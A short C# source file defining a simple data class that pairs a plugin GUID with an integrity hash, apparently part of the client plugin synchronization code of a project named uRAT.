using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace uRAT.Client.Plugin.Synchronization
{
    internal class PluginIntegrityPair
    {
        public Guid PluginGuid { get; set; }
        public byte[] IntegrityHash { get; set; }

        public PluginIntegrityPair()
        {
        }

        public PluginIntegrityPair(Guid pluginGuid, byte[] integrityHash)
        {
            PluginGuid = pluginGuid;
            IntegrityHash = integrityHash;
        }
    }
}
